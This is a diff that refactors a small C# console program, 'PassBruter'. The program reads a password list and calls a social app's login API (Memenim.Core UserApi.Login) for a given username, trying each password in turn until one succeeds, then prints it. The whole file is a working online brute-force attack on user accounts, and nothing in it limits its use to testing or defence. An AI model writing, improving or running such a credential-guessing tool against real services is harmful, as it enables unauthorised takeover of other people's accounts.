@@ -1,98 +1,100 @@
-﻿using Memenim.Core.Api;
-using System;
+﻿using System;
 using System.IO;
 using System.Collections.Generic;
-using System.Runtime.InteropServices;
+using Memenim.Core.Api;
 
 namespace PassBruter
 {
 
-    class Program
+    internal static class Program
     {
-        static private Dictionary<string, string> arguments = new Dictionary<string, string>();
+        private static readonly Dictionary<string, string> Arguments = new Dictionary<string, string>();
+        private static string _filePath = "passbase.txt";
+        private static string _login = "";
+        private static bool _showPasswords = false;
+        private static int _startPosition = 0;
 
-        static private string _FilePath = "passbase.txt";
-        static private string _Login = "";
-        static private bool _ShowPasswords = false;
-        static private int _Position = 0;
-
-        static void Main(string[] args)
+        private static void Main(string[] args)
         {
             foreach(var arg in args)
             {
                 (string, string) tuple = GetArgTuple(arg);
-                arguments.Add(tuple.Item1, tuple.Item2);
+                Arguments.Add(tuple.Item1, tuple.Item2);
             }
 
             ParseArguments();
 
-            if(string.IsNullOrEmpty(_Login) || string.IsNullOrEmpty(_FilePath))
+            if(string.IsNullOrEmpty(_login) || string.IsNullOrEmpty(_filePath))
             {
                 Console.WriteLine("Failed to start");
                 return;
             }
 
-            string[] passwordsBase = File.ReadAllLines(_FilePath);
+            string[] passwordsBase = File.ReadAllLines(_filePath);
             bool foundPass = false;
+
             while (!foundPass)
             {
-                if(_Position >= passwordsBase.Length)
-                {
+                if(_startPosition >= passwordsBase.Length)
                     break;
-                }
-                var operation = UserApi.Login(_Login, passwordsBase[_Position]);
-                if(_ShowPasswords)
+
+                var operation = UserApi.Login(
+                    _login, passwordsBase[_startPosition]);
+
+                if(_showPasswords)
                 {
-                    Console.WriteLine(passwordsBase[_Position]);
+                    Console.WriteLine(passwordsBase[_startPosition]);
                 }
                 else
                 {
                     Console.Clear();
-                    Console.WriteLine(String.Format("Progress {0}/{1}", _Position + 1, passwordsBase.Length));
+                    Console.WriteLine($"Progress {_startPosition + 1}/{passwordsBase.Length}");
                 }
-                if (!operation.Result.error)
+
+                if (!operation.Result.IsError)
                 {
-                    Console.WriteLine(String.Format("Pass for {0} found {1}", _Login, passwordsBase[_Position]));
+                    Console.WriteLine($"Pass for {_login} found {passwordsBase[_startPosition]}");
                     foundPass = true;
                 }
-                ++_Position;
+
+                ++_startPosition;
             }
 
             Console.ReadLine();
         }
 
 
-        static void ParseArguments()
+        private static void ParseArguments()
         {
-            foreach(var arg in arguments)
+            foreach(var arg in Arguments)
             {
                 switch(arg.Key)
                 {
                     case "login":
-                        _Login = arg.Value;
+                        _login = arg.Value;
                         break;
                     case "passwords":
-                        _FilePath = arg.Value;
+                        _filePath = arg.Value;
                         break;
                     case "showPasswords":
-                        _ShowPasswords = true;
+                        _showPasswords = true;
                         break;
-                    case "startFrom":
-                        _Position = Int32.Parse(arg.Value);
+                    case "startPosition":
+                        _startPosition = int.Parse(arg.Value);
                         break;
                     default:
                         break;
                 }
-            }    
+            }
         }
 
-        static (string Key, string Value) GetArgTuple(string arg)
+        private static (string Key, string Value) GetArgTuple(string arg)
         {
             string[] tuple = arg.Split(':');
+
             if(tuple.Length > 1)
-            {
                 return (tuple[0], tuple[1]);
-            }
+
             return (tuple[0], "");
         }
     }
